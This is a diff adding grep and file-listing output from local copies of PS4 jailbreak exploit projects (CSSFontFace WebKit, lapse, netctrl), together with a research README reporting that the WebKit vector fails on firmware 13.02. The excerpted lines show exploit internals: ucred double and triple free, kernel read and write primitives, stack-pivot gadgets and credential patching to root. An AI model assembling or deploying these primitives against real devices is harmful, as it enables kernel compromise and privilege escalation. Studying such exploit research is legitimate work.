@@ -1,0 +1,208 @@
+===== /tmp/cssfontface-original =====
+/tmp/cssfontface-original/README.md
+/tmp/cssfontface-original/public/src/lapse.js
+/tmp/cssfontface-original/public/src/netctrl.js
+/tmp/cssfontface-original/public/src/ps4/kernel.js
+/tmp/cssfontface-original/public/includes/script.js:12:const netctrlRadio = document.getElementById("netctrl-exploit");
+/tmp/cssfontface-original/public/includes/script.js:93:    if (exploitChain == "netctrl") {
+/tmp/cssfontface-original/public/includes/script.js:94:        netctrlRadio.checked = true;
+/tmp/cssfontface-original/public/index.html:18:      <input type="radio" name="kernel" id="netctrl-exploit" value="netctrl">
+/tmp/cssfontface-original/public/index.html:19:      <label for="netctrl-exploit">NetCtrl</label>
+/tmp/cssfontface-original/public/src/lapse.js:1071:  function kread8(addr) {
+/tmp/cssfontface-original/public/src/lapse.js:1104:  kread8(evf_cv_addr);
+/tmp/cssfontface-original/public/src/lapse.js:1115:  const p = kread8(aio_info_addr.add(8));
+/tmp/cssfontface-original/public/src/lapse.js:1123:  const p_pid = kread8(p.add(0xb0));
+/tmp/cssfontface-original/public/src/lapse.js:1133:  const p_fd = kread8(p.add(0x48));
+/tmp/cssfontface-original/public/src/lapse.js:1136:  fdt_ofiles = kread8(p_fd);
+/tmp/cssfontface-original/public/src/lapse.js:1139:  const master_pipe_fp = kread8(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+/tmp/cssfontface-original/public/src/lapse.js:1142:  const slave_pipe_fp = kread8(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+/tmp/cssfontface-original/public/src/lapse.js:1145:  const master_pipe_f_data = kread8(master_pipe_fp);
+/tmp/cssfontface-original/public/src/lapse.js:1148:  const slave_pipe_f_data = kread8(slave_pipe_fp);
+/tmp/cssfontface-original/public/src/main.js:84:        await ucred_triple_free();
+/tmp/cssfontface-original/public/src/netctrl.js:46:fn.netcontrol = new NativeFunction(0x63, "number");
+/tmp/cssfontface-original/public/src/netctrl.js:52:function netcontrol_netevent(sock, event) {
+/tmp/cssfontface-original/public/src/netctrl.js:57:  if (fn.netcontrol.invoke(-1, event, addr, size) === -1) {
+/tmp/cssfontface-original/public/src/netctrl.js:397:async function ucred_triple_free() {
+/tmp/cssfontface-original/public/src/netctrl.js:411:      netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);
+/tmp/cssfontface-original/public/src/netctrl.js:418:      // Allocate a new ucred
+/tmp/cssfontface-original/public/src/netctrl.js:431:      // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
+/tmp/cssfontface-original/public/src/netctrl.js:436:      // Unregister dummy socket and free the file and ucred
+/tmp/cssfontface-original/public/src/netctrl.js:437:      netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);
+/tmp/cssfontface-original/public/src/netctrl.js:446:      // Double free ucred.
+/tmp/cssfontface-original/public/src/netctrl.js:515:      // Triple free ucred.
+/tmp/cssfontface-original/public/src/netctrl.js:556:        throw new Error("Unable to ucred triple free !!");
+/tmp/cssfontface-original/public/src/netctrl.js:627:async function kread_slow(addr, size) {
+/tmp/cssfontface-original/public/src/netctrl.js:809:    throw new Error(`Unable to kread ${addr} !!`);
+/tmp/cssfontface-original/public/src/netctrl.js:815:async function kwrite_slow(dst, src, size) {
+/tmp/cssfontface-original/public/src/netctrl.js:960:async function kread8_slow(addr) {
+/tmp/cssfontface-original/public/src/netctrl.js:961:  const leak_buf = await kread_slow(addr, 8);
+/tmp/cssfontface-original/public/src/netctrl.js:996:  fdt_ofiles = await kread8_slow(kq_fdp);
+/tmp/cssfontface-original/public/src/netctrl.js:999:  const master_pipe_fp = await kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+/tmp/cssfontface-original/public/src/netctrl.js:1002:  const slave_pipe_fp = await kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+/tmp/cssfontface-original/public/src/netctrl.js:1005:  const master_pipe_f_data = await kread8_slow(master_pipe_fp);
+/tmp/cssfontface-original/public/src/netctrl.js:1008:  const slave_pipe_f_data = await kread8_slow(slave_pipe_fp);
+/tmp/cssfontface-original/public/src/netctrl.js:1019:  await kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);
+/tmp/cssfontface-original/public/src/ps4/constants.js:28:      pivot_view_sp: 0x10,
+/tmp/cssfontface-original/public/src/ps4/constants.js:103:      pivot_view_sp: 0x18,
+/tmp/cssfontface-original/public/src/ps4/kernel.js:150:  kread(dst, src, size) {
+/tmp/cssfontface-original/public/src/ps4/kernel.js:163:  kwrite(dst, src, size) {
+/tmp/cssfontface-original/public/src/ps4/kernel.js:179:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:185:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:193:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:201:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:209:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:217:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:225:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:233:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:239:    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:248:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:252:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:259:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:266:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:273:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:280:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:287:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:294:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:300:    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:548:  const p_ucred = kview(p).getBInt(0x40, true);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:549:  const kp_ucred = kview(kp).getBInt(0x40, true);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:551:  const prison0 = kview(kp_ucred).getBInt(0x30, true);
+/tmp/cssfontface-original/public/src/ps4/kernel.js:553:  kview(p_ucred).setInt32(0x04, 0, true); // cr_uid
+/tmp/cssfontface-original/public/src/ps4/kernel.js:554:  kview(p_ucred).setInt32(0x08, 0, true); // cr_ruid
+/tmp/cssfontface-original/public/src/ps4/kernel.js:555:  kview(p_ucred).setInt32(0x0c, 0, true); // cr_svuid
+/tmp/cssfontface-original/public/src/ps4/kernel.js:556:  kview(p_ucred).setInt32(0x10, 1, true); // cr_ngroups
+/tmp/cssfontface-original/public/src/ps4/kernel.js:557:  kview(p_ucred).setInt32(0x14, 0, true); // cr_rgid
+/tmp/cssfontface-original/public/src/ps4/kernel.js:558:  kview(p_ucred).setInt32(0x18, 0, true); // cr_svgid
+/tmp/cssfontface-original/public/src/ps4/kernel.js:559:  kview(p_ucred).setBInt(0x30, prison0, true); // cr_prison
+/tmp/cssfontface-original/public/src/ps4/kernel.js:560:  kview(p_ucred).setBInt(0x58, SYSCORE_AUTHID, true); // cr_sceAuthId
+/tmp/cssfontface-original/public/src/ps4/kernel.js:561:  kview(p_ucred).setBInt(0x60, -1, true); // cr_sceCaps[1]
+/tmp/cssfontface-original/public/src/ps4/kernel.js:562:  kview(p_ucred).setBInt(0x68, -1, true); // cr_sceCaps[0]
+/tmp/cssfontface-original/public/src/ps4/kernel.js:563:  kview(p_ucred).setUint8(0x83, 0x80); // cr_sceAttr[0]
+/tmp/cssfontface-original/public/src/ps4/userland.js:100:  pivot: undefined,
+/tmp/cssfontface-original/public/src/ps4/userland.js:110:    this.pivot.prepare(this.stack.sp);
+/tmp/cssfontface-original/public/src/ps4/userland.js:112:    const pivot_obj = {};
+/tmp/cssfontface-original/public/src/ps4/userland.js:113:    const pivot_obj_addr = arw.addrof(pivot_obj);
+/tmp/cssfontface-original/public/src/ps4/userland.js:115:    const empty_jscell = arw.view(pivot_obj_addr).getBInt(0, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:117:    const pivot_addr = this.pivot.addr;
+/tmp/cssfontface-original/public/src/ps4/userland.js:118:    arw.view(pivot_obj_addr).setBInt(0, pivot_addr, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:120:    Math.expm1(pivot_obj);
+/tmp/cssfontface-original/public/src/ps4/userland.js:122:    arw.view(pivot_obj_addr).setBInt(0, empty_jscell, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:304:    this.pivot_view = new DataView(new ArrayBuffer(0x28));
+/tmp/cssfontface-original/public/src/ps4/userland.js:311:      this.pivot_view.setBInt(8, gadgets.PUSH_RDI_POP_RSP_RET, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:312:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDI_QWORD_PTR_RAX_10_JMP_QWORD_PTR_RAX_8, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:314:      this.pivot_view.setBInt(0x10, gadgets.PUSH_RDX_POP_RSP_RET, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:315:      this.pivot_view.setBInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_18_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:324:    this.store_view.setBInt(8, this.pivot_view.buffer.data(), true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:326:    this.pivot_view.setBInt(0, this.pivot_view.buffer.data(), true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:327:    this.pivot_view.setBInt(constants.pivot_view_sp, sp, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:1211:  let m_function_pivot;
+/tmp/cssfontface-original/public/src/ps4/userland.js:1214:    m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);
+/tmp/cssfontface-original/public/src/ps4/userland.js:1216:    m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;
+/tmp/cssfontface-original/public/src/ps4/userland.js:1218:    m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
+/tmp/cssfontface-original/public/src/ps4/userland.js:1221:  arw.view(m_executableOrRareData).setBInt(constants.wk_JSFunction_m_function, m_function_pivot, true);
+/tmp/cssfontface-original/public/src/ps4/userland.js:1223:  rop.pivot = new Pivot();
+/tmp/cssfontface-original/public/src/ps4/userland.js:1284:  fn.dlsym = new NativeFunction(0x24f, "number");
+===== /tmp/cssfontface-1302research =====
+/tmp/cssfontface-1302research/README.md
+/tmp/cssfontface-1302research/README.md:4:IT IS NOT A JB. IT IS AN ATTEMPT to adapt ntfargo/CSSFontFace-exploit to 13.02
+/tmp/cssfontface-1302research/README.md:25:Conclusion: This specific UAF vector via the FontFaceSet::load thenable getter does not work on 13.02 for architectural reasons, not due to incorrect offsets or timing. To continue, you must either find another UAF vector in 13.02 WebKit (requires the libSceWebKit2.sprx binary from 13.02 for reversal) or wait for a public exploit.
+/tmp/cssfontface-1302research/README.md:29:- Confirmed that the FontFace.prototype.then getter is called on 13.02—this wasn't publicly documented.
+/tmp/cssfontface-1302research/README.md:30:- Documented behavior of matchingFaces on 13.02: B remains alive indefinitely, which differs from upstream WebKit before the Niwa fix.
+/tmp/cssfontface-1302research/README.md:32:- The code with diagnostics is a real starting point for anyone with a 13.02 binary.
+/tmp/cssfontface-1302research/index.html:125:  static get version() { return "13.02"; }
+/tmp/cssfontface-1302research/index.html:129:  // then disassemble libWebKit.so from 13.02.
+/tmp/cssfontface-1302research/index.html:203:// 0x40 = 64 rules (32 before B, 32 after B) — a reasonable minimum for 13.02.
+/tmp/cssfontface-1302research/index.html:320:  pivot: undefined,
+/tmp/cssfontface-1302research/index.html:328:    this.pivot.prepare(this.stack.sp);
+/tmp/cssfontface-1302research/index.html:330:    const pivot_obj = {};
+/tmp/cssfontface-1302research/index.html:331:    const pivot_obj_addr = arw.addrof(pivot_obj);
+/tmp/cssfontface-1302research/index.html:333:    const empty_jscell = arw.view(pivot_obj_addr).getBigUint64(0, true);
+/tmp/cssfontface-1302research/index.html:335:    const pivot_addr = this.pivot.addr;
+/tmp/cssfontface-1302research/index.html:336:    arw.view(pivot_obj_addr).setBigUint64(0, pivot_addr, true);
+/tmp/cssfontface-1302research/index.html:338:    Math.expm1(pivot_obj);
+/tmp/cssfontface-1302research/index.html:340:    arw.view(pivot_obj_addr).setBigUint64(0, empty_jscell, true);
+/tmp/cssfontface-1302research/index.html:1700:  rop.pivot = new Pivot();
+/tmp/cssfontface-1302research/index.html:1762:  fn.dlsym = new NativeFunction(0x24f, "number");
+===== /tmp/cssfontface-lapse =====
+/tmp/cssfontface-lapse/.git/description
+/tmp/cssfontface-lapse/.git/hooks/applypatch-msg.sample
+/tmp/cssfontface-lapse/.git/hooks/commit-msg.sample
+/tmp/cssfontface-lapse/.git/hooks/fsmonitor-watchman.sample
+/tmp/cssfontface-lapse/.git/hooks/post-update.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-applypatch.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-commit.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-merge-commit.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-push.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-rebase.sample
+/tmp/cssfontface-lapse/.git/hooks/pre-receive.sample
+/tmp/cssfontface-lapse/.git/hooks/prepare-commit-msg.sample
+/tmp/cssfontface-lapse/.git/hooks/push-to-checkout.sample
+/tmp/cssfontface-lapse/.git/hooks/sendemail-validate.sample
+/tmp/cssfontface-lapse/.git/hooks/update.sample
+/tmp/cssfontface-lapse/.git/info/exclude
+/tmp/cssfontface-lapse/.git/refs/heads/main
+/tmp/cssfontface-lapse/.git/refs/remotes/origin/HEAD
+/tmp/cssfontface-lapse/.git/objects/pack/pack-c6d4859c31c59a561224970636e163cc7bfccc66.pack
+/tmp/cssfontface-lapse/.git/objects/pack/pack-c6d4859c31c59a561224970636e163cc7bfccc66.rev
+/tmp/cssfontface-lapse/.git/objects/pack/pack-c6d4859c31c59a561224970636e163cc7bfccc66.idx
+/tmp/cssfontface-lapse/.git/HEAD
+/tmp/cssfontface-lapse/.git/config
+/tmp/cssfontface-lapse/.git/logs/refs/remotes/origin/HEAD
+/tmp/cssfontface-lapse/.git/logs/refs/heads/main
+/tmp/cssfontface-lapse/.git/logs/HEAD
+/tmp/cssfontface-lapse/.git/index
+/tmp/cssfontface-lapse/.git/packed-refs
+/tmp/cssfontface-lapse/LICENSE
+/tmp/cssfontface-lapse/README.md
+/tmp/cssfontface-lapse/cssfontface_lapse.png
+/tmp/cssfontface-lapse/host.py
+/tmp/cssfontface-lapse/localhost.pem
+/tmp/cssfontface-lapse/public/cache.html
+/tmp/cssfontface-lapse/public/dummy.js
+/tmp/cssfontface-lapse/public/index.html
+/tmp/cssfontface-lapse/public/lapse.js
+/tmp/cssfontface-lapse/public/main.js
+/tmp/cssfontface-lapse/public/ps4jb.cache
+/tmp/cssfontface-lapse/public/lapse.js:1039:// This will make pivoting back easy, just "leave; ret".
+/tmp/cssfontface-lapse/public/lapse.js:1067:// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
+/tmp/cssfontface-lapse/public/lapse.js:1068:// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
+/tmp/cssfontface-lapse/public/lapse.js:1071:// pushed earlier before the pivot, thus restoring the old rbp).
+/tmp/cssfontface-lapse/public/lapse.js:1214:    // Create a DOM object (textarea) which is used as the exploit pivot source.
+/tmp/cssfontface-lapse/public/lapse.js:1247:    // Stack pivot target
+/tmp/cssfontface-lapse/public/lapse.js:2497:    'dynlib_dlsym': 591,
+/tmp/cssfontface-lapse/public/lapse.js:2754:  // pivot the pthread's stack pointer to our stack
+/tmp/cssfontface-lapse/public/lapse.js:3124:  const ucred = kbuf_addr.add(4);
+/tmp/cssfontface-lapse/public/lapse.js:3127:  leak_reqs.write64(0x10, ucred);
+/tmp/cssfontface-lapse/public/lapse.js:3435:  function kread64(addr) {
+/tmp/cssfontface-lapse/public/lapse.js:3458:  const ka = kread64(kernel_addr);
+/tmp/cssfontface-lapse/public/lapse.js:3459:  //log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
+/tmp/cssfontface-lapse/public/lapse.js:3471:  const pcpu = kread64(pcpu_p);
+/tmp/cssfontface-lapse/public/lapse.js:3473:  //log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
+/tmp/cssfontface-lapse/public/lapse.js:3475:  const td = kread64(pcpu);
+/tmp/cssfontface-lapse/public/lapse.js:3478:  const proc = kread64(td.add(off_td_proc));
+/tmp/cssfontface-lapse/public/lapse.js:3482:  const pid2 = kread64(proc.add(0xb0)).lo;
+/tmp/cssfontface-lapse/public/lapse.js:3488:  const p_fd = kread64(proc.add(off_p_fd));
+/tmp/cssfontface-lapse/public/lapse.js:3491:  const ofiles = kread64(p_fd);
+/tmp/cssfontface-lapse/public/lapse.js:3493:  const off_p_ucred = 0x40;
+/tmp/cssfontface-lapse/public/lapse.js:3494:  const p_ucred = kread64(proc.add(off_p_ucred));
+/tmp/cssfontface-lapse/public/lapse.js:3495:  //log(`p_ucred ${p_ucred}`);
+/tmp/cssfontface-lapse/public/lapse.js:3498:  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
+/tmp/cssfontface-lapse/public/lapse.js:3501:  const kpipe = kread64(pipe_file);
+/tmp/cssfontface-lapse/public/lapse.js:3505:    pipe_save.write64(off, kread64(kpipe.add(off)));
+/tmp/cssfontface-lapse/public/lapse.js:3509:  const main_file = kread64(ofiles.add(main_sd * 8));
+/tmp/cssfontface-lapse/public/lapse.js:3512:  const main_sock = kread64(main_file);
+/tmp/cssfontface-lapse/public/lapse.js:3515:  const m_pcb = kread64(main_sock.add(0x18));
+/tmp/cssfontface-lapse/public/lapse.js:3518:  const m_pktopts = kread64(m_pcb.add(0x118));
+/tmp/cssfontface-lapse/public/lapse.js:3525:  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
+/tmp/cssfontface-lapse/public/lapse.js:3528:  const r_pcb = kread64(reclaim_sock.add(0x18));
+/tmp/cssfontface-lapse/public/lapse.js:3531:  const r_pktopts = kread64(r_pcb.add(0x118));
+/tmp/cssfontface-lapse/public/lapse.js:3534:  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
+/tmp/cssfontface-lapse/public/lapse.js:3537:  const w_pcb = kread64(worker_sock.add(0x18));
+/tmp/cssfontface-lapse/public/lapse.js:3540:  const w_pktopts = kread64(w_pcb.add(0x118));
+/tmp/cssfontface-lapse/public/lapse.js:3677:  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
+/tmp/cssfontface-lapse/public/lapse.js:3706:async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
+/tmp/cssfontface-lapse/public/lapse.js:3735:  kmem.write64(p_ucred.add(0x60), -1);
+/tmp/cssfontface-lapse/public/lapse.js:3737:  kmem.write64(p_ucred.add(0x68), -1);
+/tmp/cssfontface-lapse/public/lapse.js:4127:    const [kbase, kmem, p_ucred, restore_info] = make_kernel_arw(pktopts_sds, dirty_sd, reqs1_addr, kernel_addr, sds);
+/tmp/cssfontface-lapse/public/lapse.js:4130:    await patch_kernel(kbase, kmem, p_ucred, restore_info);
+/tmp/cssfontface-lapse/public/main.js:224:  pivot: undefined,
